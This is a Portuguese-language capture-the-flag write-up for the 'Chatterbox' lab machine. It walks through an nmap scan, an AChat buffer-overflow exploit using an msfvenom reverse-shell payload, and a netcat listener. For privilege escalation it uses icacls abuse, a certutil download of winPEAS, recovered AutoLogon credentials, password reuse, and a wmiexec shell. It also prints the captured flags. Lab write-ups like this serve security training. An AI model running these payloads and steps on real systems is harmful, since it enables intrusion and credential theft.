# Writeup chatterbox - PT-BR

## Scan

```bash
# Nmap 7.92 scan initiated Sun Dec 11 09:50:33 2022 as: nmap -sVC -A -Pn -v -T5 -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -oN Fullnmap.txt 10.129.33.23
Nmap scan report for 10.129.33.23
Host is up (0.16s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 SP1 (99%), Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows Vista SP2 (96%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.010 days (since Sun Dec 11 09:37:53 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h40m04s, deviation: 2h53m15s, median: 5h00m02s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-12-11T19:51:52
|_  start_date: 2022-12-11T19:38:08
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-11T14:51:53-05:00

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   156.56 ms 10.10.14.1
2   156.70 ms 10.129.33.23

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 11 09:51:59 2022 -- 1 IP address (1 host up) scanned in 86.74 seconds
```

## Enumeration

    Uma vez feito o scan, podemos notar que a porta **9255** e **9256** estão executando o Achat.

    Com uma breve pesquisa é possível descobrir que existe um exploit de Buffer OverFlow para o Achat --> [Achat 0.150 beta7 - Remote Buffer Overflow - Windows remote Exploit](https://www.exploit-db.com/exploits/36025)

## Exploitation

    Para podermos pegar uma shell usando o exploit encontrado, precisamos modificar seu payload e seu alvo.

> Gerar Payload com o MSF

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=TARGET_IP LHOST=MACHINE_IP LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

    Com o payload gerado, podemos fazer a mudança no exploit e logo em seguida mudar o host alvo.

    Com as mudanças feitas, executamos o exploit e pegamos shell.

> Shell Reversa

```bash
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.11] from (UNKNOWN) [10.129.75.248] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
chatterbox\alfred
```

    Com a shell podemos pegar a flag.

> User Flag

```bash
C:\Users\Alfred\Desktop>type user.txt
0c073371f326498a60828d77a3739356
```

## Privilege Escalation

    Essa máquina possui dois meios de se pegar a flag de root.

### Método Um

    Com a shell com usuário Alfred, é possível ver que ele possui acesso ao diretório do administrador.  

    Usando o **icacls** podemos ver suas permissões

```bash
C:\Users\Administrator>icacls Desktop
Desktop CHATTERBOX\Administrator:(F)
        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

```bash
C:\Users\Administrator\Desktop>icacls root.txt
root.txt CHATTERBOX\Administrator:(F)
```

    Podemos ver que o usuário Alfred possui as mesmas permissões que o Administrator, então podemos mudar a permissão do arquivo **root.txt** para permissão total para o usuário do Alfred para podermos ler seu conteúdo.

```bash
C:\Users\Administrator\Desktop>icacls root.txt /grant Alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
C:\Users\Administrator\Desktop>type root.txt
eb84edd97bcdcffcf959f60bd4ab265d
```

    Referência comando **icacls** --> [icacls | Microsoft Learn](https://learn.microsoft.com/pt-br/windows-server/administration/windows-commands/icacls)

### Método Dois

    Com a shell com usuário Alfred, podemos utilizar o comando certuil para baixamos o winpeas para máquina e ver o que encontramos.

```bash
certutil -urlcache -f http://IP:80/winPEASx86.exe winPEASx86.exe
```

    Com o winpeas baixado, podemos executar na máquina e esperar os resultados.

    Após executar e analizar, podemos ver o seguinte trecho com credenciais de AutoLogon

```bash
����������͹ Home folders found
    C:\Users\Administrator : Alfred [AllAccess]
    C:\Users\Alfred : Alfred [AllAccess]
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]

����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!
```

    Com essas credenciais, podemos testar se o Administrador também as usa (Password Reuse).

```bash
└─$ cme smb 10.129.75.248 -u Administrator -p 'Welcome1!'
SMB         10.129.75.248   445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.129.75.248   445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
```

    Como o administrador também usa essa senha, podemos usar o wmiexec para pegar shell.

```bash
python3 wmiexec.py Chatterbox/Administrator:'Welcome1!'@10.129.75.248 -shell-type powershell
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
chatterbox\administrator

PS C:\>
```

> Root Flag

```powershell
PS C:\> cd Users/Administrator/Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-ar--        12/11/2022   3:37 PM         34 root.txt                          



PS C:\Users\Administrator\Desktop> cat root.txt
eb84edd97bcdcffcf959f60bd4ab265d
```
